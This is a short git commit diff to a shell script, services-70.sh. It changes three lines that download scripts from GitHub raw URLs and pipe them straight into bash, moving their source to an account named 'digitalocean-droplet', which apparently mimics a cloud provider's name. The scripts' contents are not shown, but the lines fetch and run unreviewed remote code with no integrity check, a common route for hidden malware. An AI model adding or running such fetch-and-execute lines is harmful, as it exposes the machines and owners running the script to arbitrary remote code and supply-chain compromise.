63e3aa2ce088259b4163d35bfa2ed5b3be5537dc
digitalocean-droplet <121224542+digitalocean-droplet@users.noreply.github.com>
2025-09-16 11:06:34 +0700

    Update services-70.sh

--- services-70.sh
+++ services-70.sh
@@ -199,6 +199,6 @@ check_and_install_build_tools() {
 # Check and install build tools
 check_and_install_build_tools
 
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh.sh)
